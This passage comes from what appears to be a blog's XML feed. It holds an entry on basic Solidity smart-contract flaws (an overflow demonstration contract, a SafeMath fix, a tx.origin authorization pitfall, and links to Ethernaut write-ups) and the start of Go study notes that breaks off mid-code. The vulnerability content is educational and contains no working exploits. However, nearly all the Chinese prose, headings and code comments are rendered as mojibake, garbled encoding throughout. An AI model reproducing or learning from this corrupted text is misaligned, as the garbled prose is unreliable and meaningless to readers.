&#125;<br><br></code></pre></td></tr></table></figure><p>åˆå§‹åŒ–ä¸»è¦æ˜¯è®¾ç½®äº†äº¤æ˜“æ± çš„åˆå§‹ä»·æ ¼ï¼ˆæ³¨æ„ï¼Œæ­¤æ—¶æ± å­ä¸­è¿˜æ²¡æœ‰æµåŠ¨æ€§ï¼‰ï¼Œä»¥åŠè´¹ç‡ï¼Œtick ç­‰ç›¸å…³å˜é‡çš„åˆå§‹åŒ–ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆçº¦åŸºç¡€æ¼æ´</title>
    <link href="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="æ•´æ•°æº¢å‡º"><a href="#æ•´æ•°æº¢å‡º" class="headerlink" title="æ•´æ•°æº¢å‡º"></a>æ•´æ•°æº¢å‡º</h1><h2 id="åŸç†ç®€ä»‹"><a href="#åŸç†ç®€ä»‹" class="headerlink" title="åŸç†ç®€ä»‹"></a>åŸç†ç®€ä»‹</h2><p>é€šå¸¸æ¥è¯´ï¼Œåœ¨ç¼–ç¨‹è¯­è¨€é‡Œç”±ç®—æ•°é—®é¢˜å¯¼è‡´çš„æ•´æ•°æº¢å‡ºæ¼æ´å±¡è§ä¸é²œï¼Œåœ¨åŒºå—é“¾çš„ä¸–ç•Œé‡Œï¼Œæ™ºèƒ½åˆçº¦çš„Solidityè¯­è¨€ä¸­ä¹Ÿå­˜åœ¨æ•´æ•°æº¢å‡ºé—®é¢˜ï¼Œæ•´æ•°æº¢å‡ºä¸€èˆ¬åˆ†ä¸ºåˆåˆ†ä¸ºä¸Šæº¢å’Œä¸‹æº¢ï¼Œåœ¨æ™ºèƒ½åˆçº¦ä¸­å‡ºç°æ•´æ•°æº¢å‡ºçš„ç±»å‹åŒ…æ‹¬ä¸‰ç§ï¼š</p><ul><li>ä¹˜æ³•æº¢å‡º</li><li>åŠ æ³•æº¢å‡º</li><li>å‡æ³•æº¢å‡º</li></ul><p>åœ¨Solidityè¯­è¨€ä¸­ï¼Œå˜é‡æ”¯æŒçš„æ•´æ•°ç±»å‹æ­¥é•¿ä»¥8é€’å¢ï¼Œæ”¯æŒä»uint8åˆ°uint256ï¼Œä»¥åŠint8åˆ°int256ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª uint8ç±»å‹ ï¼Œåªèƒ½å­˜å‚¨åœ¨èŒƒå›´ 0åˆ°2^8-1ï¼Œä¹Ÿå°±æ˜¯[0,255] çš„æ•°å­—ï¼Œä¸€ä¸ª uint256ç±»å‹ ï¼Œåªèƒ½å­˜å‚¨åœ¨èŒƒå›´ 0åˆ°2^256-1çš„æ•°å­—ã€‚</p><p>åœ¨ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰ä¸­ä¸ºæ•´æ•°æŒ‡å®šå›ºå®šå¤§å°çš„æ•°æ®ç±»å‹ï¼Œè€Œä¸”æ˜¯æ— ç¬¦å·çš„ï¼Œè¿™æ„å‘³ç€åœ¨ä»¥å¤ªåŠè™šæ‹Ÿæœºä¸­ä¸€ä¸ªæ•´å‹å˜é‡åªèƒ½æœ‰ä¸€å®šèŒƒå›´çš„æ•°å­—è¡¨ç¤ºï¼Œä¸èƒ½è¶…è¿‡è¿™ä¸ªåˆ¶å®šçš„èŒƒå›´ã€‚</p><p>å¦‚æœè¯•å›¾å­˜å‚¨ 256è¿™ä¸ªæ•°å­— åˆ°ä¸€ä¸ª uint8ç±»å‹ä¸­ï¼Œè¿™ä¸ª256æ•°å­—æœ€ç»ˆå°†å˜æˆ 0ï¼Œæ‰€ä»¥æ•´æ•°æº¢å‡ºçš„åŸç†å…¶å®å¾ˆç®€å•ï¼Œä¸ºäº†è¯´æ˜æ•´æ•°æº¢å‡ºåŸç†ï¼Œè¿™é‡Œä»¥ 8 (uint8)ä½æ— ç¬¦æ•´å‹ä¸ºä¾‹ï¼Œ8 ä½æ•´å‹å¯è¡¨ç¤ºçš„èŒƒå›´ä¸º [0, 255]ï¼Œ255 åœ¨å†…å­˜ä¸­å­˜å‚¨æŒ‰ä½å­˜å‚¨çš„å½¢å¼ä¸ºä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/v2-72bafea677bd6b52b94cdd7f45c49b73_720w.png" alt="img"></p><p>8 ä½æ— ç¬¦æ•´æ•° 255 åœ¨å†…å­˜ä¸­å æ®äº† 8bit ä½ç½®ï¼Œè‹¥å†åŠ ä¸Š 1 æ•´ä½“ä¼šå› ä¸ºè¿›ä½è€Œå¯¼è‡´æ•´ä½“ç¿»è½¬ä¸º 0ï¼Œæœ€åå¯¼è‡´åŸæœ‰çš„ 8bit è¡¨ç¤ºçš„æ•´æ•°å˜ä¸º 0ã€‚</p><p>ä¸Šå›¾å³è¯´æ˜äº†æ™ºèƒ½åˆçº¦ä¸­æ•´æ•°ä¸Šæº¢çš„åŸç†ï¼ŒåŒæ ·æ•´æ•°ä¸‹æº¢ä¹Ÿæ˜¯ä¸€æ ·ï¼Œå¦‚ <code>(uint8)0 - 1 = (uint8)255</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.12;<br>contract POC&#123;<br>    uint256 public add = 2**256 - 1;<br>    uint256 public sub = 0;<br>    uint256 public mul = 2**255;<br>    //åŠ æ³•æº¢å‡º<br>    //å¦‚æœuint256 ç±»å‹çš„å˜é‡è¾¾åˆ°äº†å®ƒçš„æœ€å¤§å€¼(2**256 - 1)ï¼Œå¦‚æœåœ¨åŠ ä¸Šä¸€ä¸ªå¤§äº0çš„å€¼ä¾¿ä¼šå˜æˆ0<br>    function add_overflow() public view returns (uint256) &#123;<br>        return add + 1;<br>    &#125;<br><br>    //å‡æ³•æº¢å‡º<br>    //å¦‚æœuint256 ç±»å‹çš„å˜é‡è¾¾åˆ°äº†å®ƒçš„æœ€å°å€¼(0)ï¼Œå¦‚æœåœ¨å‡å»ä¸€ä¸ªå°äº0çš„å€¼ä¾¿ä¼šå˜æˆ2**256-1(uin256ç±»å‹çš„æœ€å¤§å€¼)<br>    function sub_underflow() public view returns (uint256) &#123;<br>        return sub - 1;<br>    &#125;<br>    <br>    //ä¹˜æ³•æº¢å‡º<br>    //å¦‚æœuint256 ç±»å‹çš„å˜é‡è¶…è¿‡äº†å®ƒçš„æœ€å¤§å€¼(2**256 - 1)ï¼Œæœ€åå®ƒçš„å€¼å°±ä¼šå›ç»•å˜æˆ0<br>    function mul_overflow()public view returns (uint256) &#123;<br>        return mul * 2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220806235658226.png" alt="image-20220806235658226"></p><h2 id="é˜²å¾¡æ–¹å¼"><a href="#é˜²å¾¡æ–¹å¼" class="headerlink" title="é˜²å¾¡æ–¹å¼"></a>é˜²å¾¡æ–¹å¼</h2><p>ä¸ºäº†é˜²æ­¢æ•´æ•°æº¢å‡ºçš„å‘ç”Ÿï¼Œä¸€æ–¹é¢å¯ä»¥åœ¨ç®—æœ¯é€»è¾‘å‰åè¿›è¡ŒéªŒè¯ï¼Œå¦ä¸€æ–¹é¢å¯ä»¥ç›´æ¥ä½¿ç”¨ OpenZeppelin ç»´æŠ¤çš„ä¸€å¥—æ™ºèƒ½åˆçº¦å‡½æ•°åº“ä¸­çš„ <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath">SafeMath</a> æ¥å¤„ç†ç®—æœ¯é€»è¾‘ã€‚</p><p>æ³¨æ„ï¼š0.8ç‰ˆæœ¬çš„solidityé»˜è®¤ä½¿ç”¨ SafeMathï¼Œä¸€æ—¦æº¢å‡ºç›´æ¥å›é€€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br>import &quot;@openzeppelin/contracts/utils/math/SafeMath.sol&quot;;<br>contract safe&#123;<br>    using SafeMath for uint256;<br>    uint256 public add = 2**256 - 1;<br>    uint256 public sub = 0;<br>    uint256 public mul = 2**255;<br><br>    function add_overflow() public view returns (uint256) &#123;<br>        return add + 1;<br>    &#125;<br><br>    function sub_underflow() public view returns (uint256) &#123;<br>        return sub - 1;<br>    &#125;<br>    <br>    function mul_overflow()public view returns (uint256) &#123;<br>        return mul * 2;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å°†è°ƒç”¨å¤±è´¥</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220807000410789.png" alt="image-20220807000410789"></p><h2 id="æ¡ˆä¾‹åˆ†æ"><a href="#æ¡ˆä¾‹åˆ†æ" class="headerlink" title="æ¡ˆä¾‹åˆ†æ"></a>æ¡ˆä¾‹åˆ†æ</h2><p><a href="https://sissice.github.io/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/">Ethernaut 5.Token</a></p><h1 id="é‡å…¥æ”»å‡»"><a href="#é‡å…¥æ”»å‡»" class="headerlink" title="é‡å…¥æ”»å‡»"></a>é‡å…¥æ”»å‡»</h1><p>ä¹‹å‰çš„æ–‡ç«  <a href="https://sissice.github.io/2021/11/09/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/">æ™ºèƒ½åˆçº¦é‡å…¥æ¼æ´</a></p><h1 id="éšæœºæ•°æ¼æ´"><a href="#éšæœºæ•°æ¼æ´" class="headerlink" title="éšæœºæ•°æ¼æ´"></a>éšæœºæ•°æ¼æ´</h1><h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>ä¹‹å‰çš„æ–‡ç«  <a href="https://sissice.github.io/2021/11/14/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E9%94%99%E8%AF%AF%E9%9A%8F%E6%9C%BA%E6%80%A7/">æ™ºèƒ½åˆçº¦é”™è¯¯éšæœºæ€§</a></p><h2 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h2><p>block.blockhash(block.number-1)ï¼š<a href="https://sissice.github.io/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/">Ethernaut 3.Coin Flip</a></p><h1 id="tx-origin"><a href="#tx-origin" class="headerlink" title="tx.origin"></a>tx.origin</h1><h2 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>tx.originå’Œmsg.senderå¾ˆç›´è§‚çš„åŒºåˆ«</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220814210003053.png" alt="image-20220814210003053"></p><p>tx.origin ä¸åº”ç”¨äºæˆæƒã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‰€æœ‰è€…è®¾ç½®ä¸º</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">address owner = msg.sender<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å‡½æ•°çš„è®¿é—®æ£€æŸ¥æ˜¯ç”¨</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">require(owner == tx.origin)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>è¿™å¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚</p><h2 id="æ¡ˆä¾‹-1"><a href="#æ¡ˆä¾‹-1" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h2><p><a href="https://sissice.github.io/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/">Ethernauté—¯å…³ 4.Telephone</a></p><h1 id="callè°ƒç”¨"><a href="#callè°ƒç”¨" class="headerlink" title="callè°ƒç”¨"></a>callè°ƒç”¨</h1><h2 id="åŸç†ç®€ä»‹-1"><a href="#åŸç†ç®€ä»‹-1" class="headerlink" title="åŸç†ç®€ä»‹"></a>åŸç†ç®€ä»‹</h2><p>call</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220814213108897.png" alt="image-20220814213108897"></p><p>delegateCall</p><p><img src="/2022/08/17/%E5%90%88%E7%BA%A6%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/image-20220814213131853.png" alt="image-20220814213131853"></p><h2 id="æ¡ˆä¾‹åˆ†æ-1"><a href="#æ¡ˆä¾‹åˆ†æ-1" class="headerlink" title="æ¡ˆä¾‹åˆ†æ"></a>æ¡ˆä¾‹åˆ†æ</h2><p><a href="https://sissice.github.io/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/">Ethernauté—¯å…³ 6.Delegation</a></p><p><a href="https://sissice.github.io/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/">Ethernauté—¯å…³ 16. Preservation</a></p><h1 id="åˆçº¦å˜é‡å­˜å‚¨æœºåˆ¶"><a href="#åˆçº¦å˜é‡å­˜å‚¨æœºåˆ¶" class="headerlink" title="åˆçº¦å˜é‡å­˜å‚¨æœºåˆ¶"></a>åˆçº¦å˜é‡å­˜å‚¨æœºåˆ¶</h1><p>ä¹‹å‰çš„æ–‡ç«  <a href="https://sissice.github.io/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/">åˆçº¦å˜é‡å­˜å‚¨æœºåˆ¶</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¼æ´</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GOè¯­è¨€å­¦ä¹ ç¬”è®°</title>
    <link href="/2022/08/13/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/08/13/GO%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="goè¯­è¨€å­¦ä¹ ç¬”è®°"><a href="#goè¯­è¨€å­¦ä¹ ç¬”è®°" class="headerlink" title="goè¯­è¨€å­¦ä¹ ç¬”è®°"></a>goè¯­è¨€å­¦ä¹ ç¬”è®°</h1><h2 id="èµ„æ–™"><a href="#èµ„æ–™" class="headerlink" title="èµ„æ–™"></a>èµ„æ–™</h2><p><a href="https://juejin.cn/post/7119123646471208968">ã€ŠGoå­¦ä¹ è·¯çº¿å›¾ã€‹</a></p><p><a href="https://books.studygolang.com/gopl-zh/">goè¯­è¨€åœ£ç»</a> </p><p><a href="https://gfw.go101.org/">Goè¯­è¨€101</a></p><p><a href="https://www.topgoer.com/">https://www.topgoer.com/</a></p><h2 id="ä½è¿ç®—ç¬¦"><a href="#ä½è¿ç®—ç¬¦" class="headerlink" title="ä½è¿ç®—ç¬¦"></a>ä½è¿ç®—ç¬¦</h2><table><thead><tr><th align="left">è¿ç®—ç¬¦</th><th align="left">æè¿°</th><th align="left">å®ä¾‹</th></tr></thead><tbody><tr><td align="left">&amp;</td><td align="left">æŒ‰ä½ä¸è¿ç®—ç¬¦â€&amp;â€æ˜¯åŒç›®è¿ç®—ç¬¦ã€‚ å…¶åŠŸèƒ½æ˜¯å‚ä¸è¿ç®—çš„ä¸¤æ•°å„å¯¹åº”çš„äºŒè¿›ä½ç›¸ä¸ã€‚å¦‚æœå¯¹åº”çš„ä½éƒ½ä¸º1ï¼Œé‚£ä¹ˆç»“æœå°±æ˜¯1ï¼Œ å¦‚æœä»»æ„ä¸€ä¸ªä½æ˜¯0 åˆ™ç»“æœå°±æ˜¯0</td><td align="left">(A &amp; B) ç»“æœä¸º 12, äºŒè¿›åˆ¶ä¸º 0000 1100</td></tr><tr><td align="left">|</td><td align="left">æŒ‰ä½æˆ–è¿ç®—ç¬¦â€|â€æ˜¯åŒç›®è¿ç®—ç¬¦ã€‚ å…¶åŠŸèƒ½æ˜¯å‚ä¸è¿ç®—çš„ä¸¤æ•°å„å¯¹åº”çš„äºŒè¿›ä½ç›¸æˆ–ã€‚å¦‚æœå¯¹åº”çš„ä½ä¸­ä»»ä¸€ä¸ªæ“ä½œæ•°ä¸º1 é‚£ä¹ˆç»“æœå°±æ˜¯1</td><td align="left">(A | B) ç»“æœä¸º 61, äºŒè¿›åˆ¶ä¸º 0011 1101</td></tr><tr><td align="left">^</td><td align="left">æŒ‰ä½å¼‚æˆ–è¿ç®—ç¬¦â€^â€æ˜¯åŒç›®è¿ç®—ç¬¦ã€‚ å…¶åŠŸèƒ½æ˜¯å‚ä¸è¿ç®—çš„ä¸¤æ•°å„å¯¹åº”çš„äºŒè¿›ä½ç›¸å¼‚æˆ–ï¼Œå½“ä¸¤å¯¹åº”çš„äºŒè¿›ä½ç›¸å¼‚æ—¶ï¼Œç»“æœä¸º1ã€‚</td><td align="left">(A ^ B) ç»“æœä¸º 49, äºŒè¿›åˆ¶ä¸º 0011 0001</td></tr><tr><td align="left">&lt;&lt;</td><td align="left">å·¦ç§»è¿ç®—ç¬¦â€&lt;&lt;â€æ˜¯åŒç›®è¿ç®—ç¬¦ã€‚å·¦ç§»nä½å°±æ˜¯ä¹˜ä»¥2çš„næ¬¡æ–¹ã€‚ å…¶åŠŸèƒ½æŠŠâ€&lt;&lt;â€å·¦è¾¹çš„è¿ç®—æ•°çš„å„äºŒè¿›ä½å…¨éƒ¨å·¦ç§»è‹¥å¹²ä½ï¼Œç”±â€&lt;&lt;â€å³è¾¹çš„æ•°æŒ‡å®šç§»åŠ¨çš„ä½æ•°ï¼Œé«˜ä½ä¸¢å¼ƒï¼Œä½ä½è¡¥0ã€‚</td><td align="left">A &lt;&lt; 2 ç»“æœä¸º 240 ï¼ŒäºŒè¿›åˆ¶ä¸º 1111 0000</td></tr><tr><td align="left">&gt;&gt;</td><td align="left">å³ç§»è¿ç®—ç¬¦â€&gt;&gt;â€æ˜¯åŒç›®è¿ç®—ç¬¦ã€‚å³ç§»nä½å°±æ˜¯é™¤ä»¥2çš„næ¬¡æ–¹ã€‚ å…¶åŠŸèƒ½æ˜¯æŠŠâ€&gt;&gt;â€å·¦è¾¹çš„è¿ç®—æ•°çš„å„äºŒè¿›ä½å…¨éƒ¨å³ç§»è‹¥å¹²ä½ï¼Œâ€&gt;&gt;â€å³è¾¹çš„æ•°æŒ‡å®šç§»åŠ¨çš„ä½æ•°ã€‚</td><td align="left">A &gt;&gt; 2 ç»“æœä¸º 15 ï¼ŒäºŒè¿›åˆ¶ä¸º 0000 1111</td></tr></tbody></table><h2 id="åŒ¿åç»“æ„ä½“"><a href="#åŒ¿åç»“æ„ä½“" class="headerlink" title="åŒ¿åç»“æ„ä½“"></a>åŒ¿åç»“æ„ä½“</h2><p>è¿™ä¸ªä¾‹å­å±•ç¤ºäº†ç®€å•çš„cacheï¼Œå…¶ä½¿ç”¨ä¸¤ä¸ªåŒ…çº§åˆ«çš„å˜é‡æ¥å®ç°ï¼Œä¸€ä¸ªmutexäº’æ–¥é‡ï¼ˆÂ§9.2ï¼‰å’Œå®ƒæ‰€æ“ä½œçš„cacheï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>    mu sync.Mutex <span class="hljs-comment">// guards mapping</span><br>    mapping = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span>)<br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Lookup</span><span class="hljs-params">(key <span class="hljs-keyword">string</span>)</span> <span class="hljs-title">string</span></span> &#123;<br>    mu.Lock()<br>    v := mapping[key]<br>    mu.Unlock()<br>    <span class="hljs-keyword">return</span> v<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢è¿™ä¸ªç‰ˆæœ¬åœ¨åŠŸèƒ½ä¸Šæ˜¯ä¸€è‡´çš„ï¼Œä½†å°†ä¸¤ä¸ªåŒ…çº§åˆ«çš„å˜é‡æ”¾åœ¨äº†cacheè¿™ä¸ªstructä¸€ç»„å†…ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//ä¾æ¬¡è¿›è¡Œäº†å®šä¹‰ã€åˆå§‹åŒ–ã€èµ‹å€¼</span><br><span class="hljs-keyword">var</span> cache = <span class="hljs-keyword">struct</span> &#123;<br>    sync.Mutex<br>    mapping <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span><br>&#125;&#123;<br>    mapping: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span>),<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Lookup</span><span class="hljs-params">(key <span class="hljs-keyword">string</span>)</span> <span class="hljs-title">string</span></span> &#123;<br>    cache.Lock()<br>    v := cache.mapping[key]<br>    cache.Unlock()<br>    <span class="hljs-keyword">return</span> v<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç»™æ–°çš„å˜é‡èµ·äº†ä¸€ä¸ªæ›´å…·è¡¨è¾¾æ€§çš„åå­—ï¼šcacheã€‚å› ä¸ºsync.Mutexå­—æ®µä¹Ÿè¢«åµŒå…¥åˆ°äº†è¿™ä¸ªstructé‡Œï¼Œå…¶Lockå’ŒUnlockæ–¹æ³•ä¹Ÿå°±éƒ½è¢«å¼•å…¥åˆ°äº†è¿™ä¸ªåŒ¿åç»“æ„ä¸­äº†ï¼Œè¿™è®©æˆ‘ä»¬èƒ½å¤Ÿä»¥ä¸€ä¸ªç®€å•æ˜äº†çš„è¯­æ³•æ¥å¯¹å…¶è¿›è¡ŒåŠ é”è§£é”æ“ä½œã€‚</p><p>ä¸€ä¸ªåº”ç”¨çš„ä¾‹å­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br> <br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;encoding/json&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><span class="hljs-comment">//å®šä¹‰æ‰‹æœºå±å¹•</span><br><span class="hljs-keyword">type</span> Screen01 <span class="hljs-keyword">struct</span> &#123;<br>Size       <span class="hljs-keyword">float64</span> <span class="hljs-comment">//å±å¹•å°ºå¯¸</span><br>ResX, ResY <span class="hljs-keyword">int</span> <span class="hljs-comment">//å±å¹•åˆ†è¾¨ç‡ æ°´å¹³ å‚ç›´</span><br>&#125;<br><span class="hljs-comment">//å®šä¹‰ç”µæ± å®¹é‡</span><br><span class="hljs-keyword">type</span> Battery <span class="hljs-keyword">struct</span> &#123;<br>Capacity <span class="hljs-keyword">string</span><br>&#125;<br> <br><span class="hljs-comment">//è¿”å›jsonæ•°æ®</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getJsonData</span><span class="hljs-params">()</span> []<span class="hljs-title">byte</span></span> &#123;<br><span class="hljs-comment">//tempData æ¥æ”¶åŒ¿åç»“æ„ä½“ï¼ˆåŒ¿åç»“æ„ä½“ä½¿å¾—æ•°æ®çš„ç»“æ„æ›´åŠ çµæ´»ï¼‰</span><br>tempData := <span class="hljs-keyword">struct</span> &#123;<br>Screen01<br>Battery<br>HashTouchId <span class="hljs-keyword">bool</span>  <span class="hljs-comment">// æ˜¯å¦æœ‰æŒ‡çº¹è¯†åˆ«</span><br>&#125;&#123;<br>Screen01:    Screen01&#123;Size: <span class="hljs-number">12</span>, ResX: <span class="hljs-number">36</span>, ResY: <span class="hljs-number">36</span>&#125;,<br>Battery:     Battery&#123;<span class="hljs-string">&quot;6000æ¯«å®‰&quot;</span>&#125;,<br>HashTouchId: <span class="hljs-literal">true</span>,<br>&#125;<br>jsonData, _ := json.Marshal(tempData)  <span class="hljs-comment">//å°†æ•°æ®è½¬æ¢ä¸ºjson</span><br><span class="hljs-keyword">return</span> jsonData<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>jsonData := getJsonData() <span class="hljs-comment">//è·å–jsonæ•°æ®</span><br>fmt.Println(jsonData)<br>fmt.Println(<span class="hljs-string">&quot;=========è§£æï¼ˆåˆ†ç¦»ï¼‰å‡ºçš„æ•°æ®æ˜¯===========&quot;</span>)<br><span class="hljs-comment">//è‡ªå®šä¹‰åŒ¿åç»“æ„ä½“ï¼Œè§£æï¼ˆåˆ†ç¦»ï¼‰å…¨éƒ¨æ•°æ®</span><br>allData := <span class="hljs-keyword">struct</span> &#123;<br>Screen01<br>Battery<br>HashTouchId <span class="hljs-keyword">bool</span><br>&#125;&#123;&#125;<br>json.Unmarshal(jsonData, &amp;allData)<br>fmt.Println(<span class="hljs-string">&quot;è§£æï¼ˆåˆ†ç¦»ï¼‰å…¨éƒ¨ç»“æ„ä¸ºï¼š&quot;</span>, allData)<br><span class="hljs-comment">//è‡ªå®šä¹‰åŒ¿åç»“æ„ä½“ï¼Œé€šè¿‡jsonæ•°æ®ï¼Œè§£æï¼ˆåˆ†ç¦»ï¼‰å¯¹åº”çš„ç»“æ„ï¼ˆå¯ä»¥æ˜¯éƒ¨åˆ†ç»“æ„ï¼‰</span><br>screenBattery := <span class="hljs-keyword">struct</span> 